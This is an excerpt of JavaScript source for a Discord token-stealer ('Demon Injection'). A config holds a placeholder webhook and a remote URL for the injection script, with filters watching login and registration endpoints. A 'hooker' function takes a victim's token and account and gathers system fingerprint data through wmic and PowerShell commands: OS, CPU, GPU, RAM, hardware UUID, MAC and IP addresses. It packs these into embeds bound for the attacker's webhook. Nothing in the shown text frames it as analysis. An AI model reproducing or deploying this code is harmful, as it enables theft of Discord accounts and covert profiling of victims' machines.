...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/klsklskls1111/discord-injection/main/index.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "Demon Injection";
    content["avatar_url"] = "https://cdn.discordapp.com/avatars/1380555443838910566/9bd1b4d9ba3e59bffbaeb94e62d20a65.png?size=4096";
    ...
    const [
        ...
        execCommand("wmic OS get caption, osarchitecture | more +1").then(out => out.trim()),
        execCommand("wmic cpu get name | more +1").then(out => out.trim()),
        execCommand("wmic PATH Win32_VideoController get name | more +1").then(out => out.replace(/\r\n|\r/g, "").trim()),
        execCommand("wmic computersystem get totalphysicalmemory | more +1").then(out => {
            const gb = Math.floor(parseInt(out.trim()) / (1024 * 1024 * 1024));
            return gb ? `${gb} GB` : "Unknown";
        }),
        execCommand("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").then(out => out.trim()),
        execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName").then(out => out.trim()),
        execCommand("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").then(out => out.trim()),
        execCommand("powershell.exe (Get-NetIPAddress).IPAddress").then(out => out.trim()),
        execCommand("echo %NUMBER_OF_PROCESSORS%").then(out => out.trim())
    ]);

    const computerInfoDesc =
        `**OS:** ${osInfo}\n` +
        `**CPU:** ${cpu}\n` +
        `**GPU:** ${gpu}\n` +
        `**RAM:** ${ram}\n` +
    ...
    content["embeds"].push(
        ...
        },
        {
            ...
            "description": computerInfoDesc,
        }
    );
    // Aplica color rojo a todos los embeds
